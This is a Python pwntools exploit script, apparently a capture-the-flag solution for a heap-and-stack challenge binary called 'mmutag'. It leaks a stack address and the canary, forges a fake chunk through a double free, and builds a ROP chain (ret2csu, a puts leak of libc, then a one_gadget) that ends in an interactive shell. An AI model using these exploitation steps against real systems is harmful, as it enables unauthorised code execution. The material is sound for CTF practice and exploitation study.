# encoding=utf-8
from pwn import *
elf = ELF('./mmutag')
# p = elf.process()
p = remote('127.0.0.1', 10001)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
one_gadget = [0x45226, 0x4527a, 0xf0364, 0xf1207]

def read_introduce1(introduce):
    p.sendlineafter("input your choice:\n\n", "1")
    p.sendafter("your introduce \n", introduce)

def introduce():
    p.sendlineafter("input your choice:\n\n", "2")

def add(index, content):
    p.sendlineafter("your choise:\n", "1")
    p.sendlineafter("your id:\n", str(index))
    p.sendafter("your content\n", content)

def delete(index):
    p.sendlineafter("your choise:\n", "2")
    p.sendlineafter("your id:\n", str(index))

def stack_leak(content):
    p.sendlineafter("your choise:\n", "3")
    p.send(content)

poprdi = 0x0000000000400d23

p.recvuntil("input you name: \n")
p.sendline("ld1ng")
p.recvuntil("your tag: ")
stack_address = int(p.recvuntil(":", drop=True), 16)
log.success("stack address {}".format(hex(stack_address)))
#read_introduce1(p64(0x71))
introduce()
stack_leak("1"*0x19)
p.recvuntil("Your content: ")
p.recvuntil("1"*0x18)
canary = u64(p.recv(8)) - ord("1")# leak canary
log.success("canary {}".format(hex(canary)))
stack_leak(p64(0) + p64(0x71) + p64(0)+'\x00')#build fake chunk , end of canary->00
add(1,'ld1ng')
add(2,'ld1ng')
delete(1)
delete(2)
delete(1) # double free
add(3, p64(stack_address - 0x40))# fd->fake chunk
add(5,'ld1ng')
add(6,'ld1ng')
#gdb.attach(p)
payload = b"a"*0x8 + p64(canary)
payload += p64(stack_address + 0x10)
payload += p64(poprdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])
payload += p64(0x400D1C)#__libc_csu_init
payload += p64(elf.got['read']) + p64(0x80) + p64(stack_address+0x28) + p64(0)
payload += p64(0x400d00) #ret2csu
add(7, payload)
#gdb.attach(p)
p.sendlineafter("your choise:\n", "4")# trigger bug

libc.address = u64(p.recvline().strip(b"\n").ljust(8, b"\x00")) - libc.sym['puts']
log.success("libc address {}".format(hex(libc.address)))
# str_sh = libc.search(b"/bin/sh\x00").next()
# log.success("str_bin/sh {}".format(hex(str_sh)))

# payload = p64(poprdi) + p64(str_sh)
# payload += p64(libc.sym['system'])
onegadget = libc.address + one_gadget[1]
log.success("one:" + hex(onegadget))
payload = p64(onegadget)
p.send(payload)
# pause()
p.interactive()
